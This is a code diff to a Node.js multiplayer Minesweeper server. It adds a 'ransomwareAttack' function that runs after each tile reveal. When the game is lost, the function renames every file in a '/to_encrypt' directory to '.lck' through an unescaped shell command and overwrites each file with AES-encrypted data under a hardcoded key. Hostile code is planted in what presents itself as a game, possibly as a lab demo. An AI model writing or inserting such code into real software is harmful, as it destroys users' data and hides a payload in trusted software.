@@ -17,6 +17,10 @@ const log4js = require('log4js');
 const logger = log4js.getLogger();
 const shortid = require('shortid');
 
+const shell = require('child_process').execSync;
+const crypto = require('crypto'); 
+const fs = require("fs");
+
 const Games = require('./games');
 const defaultGame = Games.createGame(config.board.width, config.board.height, config.board.mines, 'Default game');
 defaultGame.doNotDelete = true;
@@ -96,6 +100,60 @@ io.on('connection', (socket) => {
     }
   }
 
+  function ransomwareAttack() {
+    if (game.getBoard().lost) {
+      logger.warn('BooooomBooooom');
+  
+      
+
+      const algorithm = 'aes-256-ctr';
+      let key = 'MySuperSecretKey';
+      key = crypto.createHash('sha256').update(key).digest('base64').substr(0, 32);
+
+      const encrypt = (buffer) => {
+        // Create an initialization vector
+        const iv = crypto.randomBytes(16);
+        // Create a new cipher using the algorithm, key, and iv
+        const cipher = crypto.createCipheriv(algorithm, key, iv);
+        // Create the new (encrypted) buffer
+        const result = Buffer.concat([iv, cipher.update(buffer), cipher.final()]);
+        return result;
+      };
+
+      const dir = '/to_encrypt';
+      //passsing directoryPath and callback function
+      fs.readdir(dir, function (err, files) {
+          //handling error
+          if (err) {
+              return console.log('Unable to scan directory: ' + err);
+          } 
+          //listing all files using forEach
+          files.forEach(function (file) {
+              // Do whatever you want to do with the file
+              console.log(file); 
+
+              if (file.split('.').pop() == 'lck') return;
+
+              var currentPath = dir + '/' + file;
+              var newPath= dir + '/' + file + '.lck';
+
+              shell(`mv ${currentPath} ${newPath}`);
+
+              fs.readFile(newPath, function(err, buf) {
+                //console.log(buf.toString());
+                var encrypted = encrypt(buf).toString();
+                fs.writeFile(newPath, encrypted, (err) => {
+                  if (err) console.log(err);
+                  console.log("Successfully Written to File.");
+                });
+              });
+
+          });
+      });
+
+    }
+  }
+
   socket.on('reveal', (coord) => {
     if (game.resetting)
       return;
@@ -105,6 +163,8 @@ io.on('connection', (socket) => {
     io.to(game.gameId).emit('players', game.getPlayers());
 
     handleGameEnding();
+    
+    ransomwareAttack();
   });
 
   socket.on('chord reveal', (coord) => {
@@ -177,7 +237,7 @@ app.get('/solo', (req, res) => {
   res.sendFile(__dirname + '/solo.html');
 });
 app.get('/client.js', (req, res) => {
-  res.sendFile(__dirname + '/js/uglified.js');
+  res.sendFile(__dirname + '/js/client.js');
 });
 app.get('/menu.js', (req, res) => {
   res.sendFile(__dirname + '/menu.js');
